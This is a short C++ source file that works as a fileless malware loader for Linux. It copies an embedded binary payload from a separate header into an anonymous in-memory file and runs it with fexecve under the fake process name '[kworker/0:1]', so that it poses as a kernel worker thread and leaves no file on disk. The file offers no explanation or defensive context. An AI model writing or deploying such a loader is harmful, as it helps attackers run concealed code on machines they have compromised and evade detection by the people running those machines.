#define _GNU_SOURCE
#include <sys/mman.h>
#include <unistd.h>
#include <cstring>
#include <cstdio>
#include "../modules/payload.h"

void createPayloadFile() {
    #if defined(__linux__)
    int fd = memfd_create("", MFD_CLOEXEC);
    if (fd == -1) {
        perror("memfd_create");
        return;
    }

    size_t written = 0;
    while (written < payload_bin_len) {
        ssize_t ret = write(fd, payload_bin + written, payload_bin_len - written);
        if (ret == -1) {
            perror("write");
            close(fd);
            return;
        }
        written += ret;
    }

    char* argv[] = { const_cast<char*>("[kworker/0:1]"), nullptr };
    char* envp[] = { nullptr };
    fexecve(fd, argv, envp);

    perror("fexecve");
    close(fd);
    #endif
}

int main() {
    createPayloadFile();
    return 0;
}

